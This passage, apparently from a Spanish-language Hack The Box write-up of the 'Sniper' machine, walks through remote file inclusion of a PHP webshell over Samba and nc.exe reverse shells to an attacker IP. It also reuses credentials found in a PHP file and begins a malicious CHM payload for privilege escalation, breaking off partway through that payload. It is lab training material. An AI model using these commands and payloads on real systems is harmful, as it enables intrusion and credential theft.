guest &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
directory &lt;span class=&#34;nv&#34;&gt;mode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0555&lt;/span&gt;
force &lt;span class=&#34;nv&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; nobody
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;service smbd restart 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Acceder a:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\\10.10.10.10\test\
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La webshell que utilizamos es &lt;a href=&#34;https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php&#34;&gt;WhiteWinterWolf - Webshell&lt;/a&gt;. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_201844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.244&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;c.exe -e C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&#34;se&#34;&gt;\v&lt;/span&gt;1.0&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;owershell.exe 10.10.15.244 &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_202318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario IUSR.&lt;/p&gt;
&lt;h1 id=&#34;user---chris&#34;&gt;USER - Chris&lt;/h1&gt;
&lt;p&gt;Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_202509.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Host, User, Password, DB
&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;dbuser&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;36mEAhz/B8xQ~2VM&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;sniper&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de las carpetas de Usuarios (C:\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User SMB session established on 10.10.10.151...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: 10.10.10.151:445	Name: 10.10.10.151                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	InitShutdown
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	lsass
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ntsvcs
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	scerpc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-368-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	epmapper
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-1e4-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	LSM_API_service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	eventlog
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-408-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	atsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-598-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	wkssvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	spoolss
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-a2c-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	trkwks
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	W32TIME_ALT
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	srvsvc
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	vgauth-service
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-270-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	Winsock2&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;atalogChangeListener-284-0
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	ROUTER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PIPE_EVENTROOT&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132236907993416575.1908.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	iislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237251159401733.1252.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	IISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	IISFCGI-0587ff21-c423-47bb-872e-34f067d827a9
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237302290243128.4168.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237304828945308.4400.DefaultAppDomain.powershell
	fr--r--r--                &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Sun Dec &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 17:57:56 1600	PSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost
	IPC$                                              	READ ONLY	Remote IPC
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina &lt;a href=&#34;https://sckull.github.io/posts/arkham/#user-batman&#34;&gt;&lt;strong&gt;Arkham de HackTheBox&lt;/strong&gt;&lt;/a&gt; en la que utilizamos las credenciales para obtener una sesion nueva utilizando powershell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Sniper\Chris&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;convertto-securestring&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-String&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;36mEAhz/B8xQ~2VM&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nb&#34;&gt;New-PSSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Enter-PSSession&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203242.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.244&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;c.exe -e C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&#34;se&#34;&gt;\v&lt;/span&gt;1.0&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;owershell.exe 10.10.15.244 &lt;span class=&#34;m&#34;&gt;448&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;h2 id=&#34;malicious-chm-file&#34;&gt;Malicious CHM file&lt;/h2&gt;
&lt;p&gt;Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en &lt;code&gt;C:\Users\Chris\Downloads&lt;/code&gt; llamado instructions.chm.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203728.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al abrirlo en Windows nos muestra un mensaje.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!
I&#39;m never completing this thing. Gonna leave this place next week. Hope someone snipes him.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203803.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De igual forma encontramos una nota en &lt;code&gt;C:\Docs&lt;/code&gt; y un PDF.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_203938.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;php for dummies-trial.pdf:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_204057.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;note.txt:
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&lt;span class=&#34;s1&#34;&gt;&amp;#39;ve prepared the documentation for our new app. Drop it here when you&amp;#39;&lt;/span&gt;re &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; with it.

Regards,
Sniper CEO.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.&lt;/p&gt;
&lt;p&gt;Copiamos el archivo instructions.chm en C:\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (&amp;ldquo;Administrador&amp;rdquo;).&lt;/p&gt;
&lt;p&gt;Creamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos &amp;ldquo;Microsoft HTML Help Workshop and Documentation&amp;rdquo; para generarlo.&lt;/p&gt;
&lt;p&gt;Agregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;OBJECT&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;classid=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;width=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;height=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Command&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ShortCut&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Button&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Bitmap::shortcut&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
